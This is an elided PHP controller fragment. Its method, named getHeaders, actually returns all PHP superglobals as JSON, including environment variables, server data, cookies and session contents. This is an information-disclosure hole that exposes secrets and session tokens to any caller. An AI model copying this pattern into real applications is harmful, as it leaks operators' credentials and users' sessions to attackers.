...
*/
	...
	public function getHeaders(){
		...
		return Response::json(['data' => ['globals' => $GLOBALS, '_server' => $_SERVER, '_get' => $_GET, '_post' => $_POST, '_files' => $_FILES, '_cookie' => $_COOKIE, '_session' => app()->request->session(), '_request' => $_REQUEST, '_env' => $_ENV]]);	
	}
